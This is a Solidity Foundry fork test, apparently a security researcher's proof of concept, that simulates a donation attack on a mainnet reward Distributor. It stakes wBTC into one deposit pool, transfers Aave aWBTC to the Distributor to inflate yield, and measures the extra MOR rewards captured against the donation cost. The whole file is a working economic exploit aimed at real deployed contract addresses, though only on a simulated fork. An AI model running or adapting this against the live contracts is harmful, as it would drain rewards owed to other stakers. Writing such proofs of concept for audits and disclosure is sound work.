// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {Test} from "forge-std/Test.sol";

interface IERC20 { function balanceOf(address) external view returns (uint256); function transfer(address,uint256) external returns(bool); function approve(address,uint256) external returns(bool); }
interface IDistrib {
    function distributeRewards(uint256) external;
    function minRewardsDistributePeriod() external view returns (uint256);
    function rewardPoolLastCalculatedTimestamp(uint256) external view returns (uint128);
    function depositPools(uint256,address) external view returns (
        address token, string memory chainLinkPath, uint256 tokenPrice, uint256 deposited,
        uint256 lastUnderlyingBalance, uint8 strategy, address aToken, bool isExist);
}
interface IAavePool { function supply(address,uint256,address,uint16) external; }
interface ICL { function getPathId(string memory) external pure returns (bytes32); function getChainLinkDataFeedLatestAnswer(bytes32) external view returns (uint256); }
interface IDepositPool {
    function stake(uint256,uint256,uint128,address) external;
    function getLatestUserReward(uint256,address) external view returns (uint256);
}

// End-to-end NET PROFIT: attacker stakes into the wBTC pool, then compares own accrued MOR reward
// with vs without a yield donation to the Distributor. Net = (extra MOR)*price - donation cost.
contract DonationProfit is Test {
    IDistrib constant D = IDistrib(0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A);
    IAavePool constant AAVE = IAavePool(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    IDepositPool constant WBTC_POOL = IDepositPool(0xdE283F8309Fd1AA46c95d299f6B8310716277A42);
    address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address constant CL = 0xd182263d06FDC463c96190005D6359CC3d3Bbc5e;
    uint256 constant MOR_USD_1e8 = 179000000; // ~$1.79
    uint256 constant WBTC_USD = 77775; // ~$/wBTC

    address[5] POOLS = [
        0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790,
        0x9380d72aBbD6e0Cc45095A2Ef8c2CA87d77Cb384,
        0xdE283F8309Fd1AA46c95d299f6B8310716277A42,
        0x6cCE082851Add4c535352f596662521B4De4750E,
        0x3B51989212BEdaB926794D6bf8e9E991218cf116
    ];

    function _freshenPrices() internal {
        for (uint256 i; i < 5; i++) {
            (, string memory path, , , , , , bool ex) = D.depositPools(0, POOLS[i]);
            if (!ex) continue;
            bytes32 pid = ICL(CL).getPathId(path);
            uint256 px = ICL(CL).getChainLinkDataFeedLatestAnswer(pid);
            vm.mockCall(CL, abi.encodeWithSelector(ICL.getChainLinkDataFeedLatestAnswer.selector, pid), abi.encode(px));
        }
    }

    function test_netProfit() public {
        vm.createSelectFork(vm.envOr("ETH_RPC", string("https://ethereum-rpc.publicnode.com")), 25996939);
        _freshenPrices();
        address attacker = makeAddr("ATTACKER");

        // 1) Attacker becomes the dominant staker of the wBTC pool: stake ~0.95 wBTC (existing ~0.104).
        uint256 stakeAmt = 95_000_000; // 0.95 wBTC
        deal(WBTC, attacker, stakeAmt);
        vm.startPrank(attacker);
        IERC20(WBTC).approve(address(D), type(uint256).max);
        try WBTC_POOL.stake(0, stakeAmt, 0, address(0)) {} catch Error(string memory r) { emit log_named_string("stake revert", r); }
        vm.stopPrank();

        // advance one distribution period
        uint128 lastCalc = D.rewardPoolLastCalculatedTimestamp(0);
        uint256 target = uint256(lastCalc) + D.minRewardsDistributePeriod() + 100;
        if (block.timestamp < target) vm.warp(target);
        _freshenPrices();

        uint256 snap = vm.snapshot();

        // 2) BASELINE: honest distribute, read attacker's accrued reward
        D.distributeRewards(0);
        uint256 rewardBaseline = WBTC_POOL.getLatestUserReward(0, attacker);

        // 3) ATTACK: donate optimal aWBTC (~0.016 wBTC ~ $1.2k) then distribute
        vm.revertTo(snap);
        uint256 donateWbtc = 1_600_000; // 0.016 wBTC
        deal(WBTC, attacker, donateWbtc);
        vm.startPrank(attacker);
        IERC20(WBTC).approve(address(AAVE), donateWbtc);
        AAVE.supply(WBTC, donateWbtc, attacker, 0);
        (, , , , , , address aWBTC, ) = D.depositPools(0, POOLS[2]);
        uint256 aBal = IERC20(aWBTC).balanceOf(attacker);
        IERC20(aWBTC).transfer(address(D), aBal);
        vm.stopPrank();
        D.distributeRewards(0);
        uint256 rewardAttack = WBTC_POOL.getLatestUserReward(0, attacker);

        // 4) Economics
        emit log_named_uint("attacker accrued MOR (baseline)", rewardBaseline);
        emit log_named_uint("attacker accrued MOR (attack)", rewardAttack);
        uint256 extraMor = rewardAttack > rewardBaseline ? rewardAttack - rewardBaseline : 0;
        emit log_named_uint("EXTRA MOR captured", extraMor);
        uint256 extraUsd_1e8 = extraMor * MOR_USD_1e8 / 1e18; // USD*1e8
        emit log_named_uint("EXTRA value USD (1e8)", extraUsd_1e8);
        uint256 donationUsd_1e8 = donateWbtc * WBTC_USD * 1e8 / 1e8; // wBTC 8dec * $/btc -> USD*1e8
        emit log_named_uint("donation cost USD (1e8)", donationUsd_1e8);
        if (extraUsd_1e8 > donationUsd_1e8) emit log_named_uint("NET PROFIT USD (1e8) per attack", extraUsd_1e8 - donationUsd_1e8);
        else emit log_named_uint("NET LOSS USD (1e8)", donationUsd_1e8 - extraUsd_1e8);
    }
}
